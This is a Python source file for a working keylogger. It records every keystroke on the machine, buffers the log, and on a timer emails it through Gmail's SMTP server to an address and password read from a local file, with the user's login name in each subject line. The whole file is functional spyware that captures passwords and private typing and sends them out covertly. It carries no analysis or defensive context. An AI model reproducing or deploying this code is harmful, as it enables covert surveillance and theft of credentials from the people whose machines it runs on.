import keyboard
import smtplib
import sys
import os
import datetime

from threading import Semaphore, Timer
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

with open('E:/src/password.txt', 'r') as f:
    file = f.readlines()
    email = file[0]
    password = file[1]
    interval = int(file[2])

username = os.getlogin()

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            current_time = datetime.datetime.now()

            msg = MIMEMultipart()
            msg['From'] = f'{username}-Logs'
            msg['To'] = email
            msg['Subject'] = f'Logging-{username}: {current_time}'
            msg.attach(MIMEText(self.log, 'plain'))
            text = msg.as_string()

            self.sendmail(email, password, text)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=interval)
    keylogger.start()